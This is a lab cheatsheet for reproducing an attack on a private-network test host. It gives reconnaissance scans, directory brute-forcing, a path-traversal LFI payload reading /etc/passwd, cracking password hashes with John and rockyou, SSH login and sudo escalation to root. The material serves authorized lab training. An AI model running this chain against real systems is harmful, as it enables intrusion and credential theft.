# Commands & Notes — Quick Cheatsheet

> Quick, copy‑paste friendly commands and short explanations for reproducing the Alpha Attack lab steps. Use these only in an isolated lab environment. Every command below includes a short comment describing its purpose.

---

## Environment Setup

```bash
# create project directories for outputs and screenshots
mkdir -p AlphaAttack-Cuppa-LFI/{outputs,nmap,zap,john,screenshots,writeup}
# purpose: organize artifacts so outputs are collected and easy to redact later
```

---

## Network Reconnaissance (nmap / Zenmap)

```bash
# ping sweep to discover live hosts in the lab network
nmap -sn 192.168.56.0/24 -oA outputs/nmap/ping_sweep
# purpose: find live IPs quickly

# aggressive scan (service/version detection, default scripts, traceroute)
nmap -A -sV -p- 192.168.56.101 -oA outputs/nmap/initial_scan
# purpose: enumerate open ports and services for attack surface mapping
```

Notes:

* Use Zenmap GUI for visually examining scan results if preferred.
* Keep raw nmap outputs in `outputs/nmap/` for traceability and later redaction.

---

## Web Discovery (forced browse / gobuster)

```bash
# forced browse with common wordlist to find hidden directories
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirb/common.txt -t 50 -o outputs/gobuster/webenum.txt
# purpose: discover admin panels or hidden endpoints

# optional: a heavier wordlist for deeper discovery
gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o outputs/gobuster/webenum-heavy.txt
# purpose: increase coverage at the cost of runtime
```

---

## Proxying & Interception (ZAP + FoxyProxy)

Instructions:

1. Install and run OWASP ZAP.
2. Configure FoxyProxy in your browser to point to ZAP's proxy (default `127.0.0.1:8080`).
3. Browse the target site to populate ZAP's history, then use ZAP's Forced Browse and Request Editor.

Notes:

* Export ZAP session: `File → Export Session` and save to `outputs/zap/session.session`.
* Purpose: capture requests/responses and edit payloads for LFI testing.

---

## LFI Testing (confirm file inclusion)

```bash
# test LFI with curl (adjust traversal depth as needed)
curl -s 'http://192.168.56.101/alertConfigField.php?urlConfig=../../../../../../etc/passwd' -o outputs/exfiltrated/etc_passwd.txt
# purpose: confirm ability to read /etc/passwd via LFI and save output

# alternative: request via browser ZAP and use the Request Editor to iterate safely
# purpose: use ZAP to keep history and modify requests interactively
```

Security note: Never run commands like these against systems you don't own or have explicit permission to test.

---

## Preparing for Password Cracking

```bash
# ensure you have a local copy of rockyou wordlist (Debian/Ubuntu path shown)
# purpose: provide a common wordlist for John
ls /usr/share/wordlists/rockyou.txt || echo "rockyou not found, install wordlists package"

# prepare the 'unshadow' file: combine passwd and shadow entries if needed
# (example shows the command if you have both files locally)
# purpose: John expects a combined format for cracking
unshadow outputs/exfiltrated/etc_passwd.txt outputs/exfiltrated/etc_shadow.txt > outputs/john/unshadow.txt
```

---

## Password Cracking (John the Ripper)

```bash
# run John with sha512crypt format using rockyou
john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt outputs/john/unshadow.txt --pot=outputs/john/john.pot
# purpose: attempt to crack hashes and store results in a potfile

# show cracked passwords
john --show outputs/john/unshadow.txt --pot=outputs/john/john.pot > outputs/john/john-show.txt
# purpose: produce a readable output file with cracked credentials
```

Notes:

* If John fails, try `--rules` or other wordlists; consider `hashcat` for GPU acceleration in a lab.
* Never commit `john.pot` or `john-show.txt` to a public repo with real data.

---

## SSH Access & Privilege Enumeration

```bash
# SSH into target using recovered credentials
ssh w1r3s@192.168.56.101
# purpose: obtain an interactive shell for post-exploitation

# on target: check sudo privileges
sudo -l
# purpose: enumerate allowed sudo commands and possible NOPASSWD entries

# escalate if allowed
sudo -i
# purpose: spawn an interactive root shell if permitted
```

Post‑exploit note: document each command and capture terminal output (e.g., `script` command) and save to `outputs/`.

---

## Evidence Collection & Redaction

```bash
# collect outputs into a single archive for review (before redaction)
tar -czvf outputs/artifacts-raw.tar.gz outputs/
# purpose: snapshot raw artifacts for offline redaction

# redact sensitive strings (example: replace literal IPs)
# WARNING: this is a naive example; use careful regex and manual review before publishing
sed -i 's/192.168.56.101/REDACTED_IP/g' outputs/exfiltrated/* outputs/john/*
# purpose: basic automated masking — always manually verify removal of secrets
```

Redaction checklist (manual):

* Remove or mask real IPs, hostnames, usernames, and passwords.
* Remove SSH private keys, PEM files, or any credentials.
* Replace screenshots that expose identifiable info or redact them with an image editor.

---

## Helpful Utilities & Tips

* Use `script -q -f outputs/sessions/ssh-session-$(date +%s).log` to record interactive shells (keystroke-level logs).
* Use `jq` to pretty print JSON outputs from tools.
* Keep a log of timestamps for each major action (e.g., `echo "T+01:30 — LFI confirmed" >> outputs/notes/timeline.txt`).

---
## Final Reminder (Ethics & Publication)

* Only use these commands within the authorized lab environment.
* Sanitize all outputs before publishing.
* When in doubt about whether something is sensitive, remove it or consult the team lead.



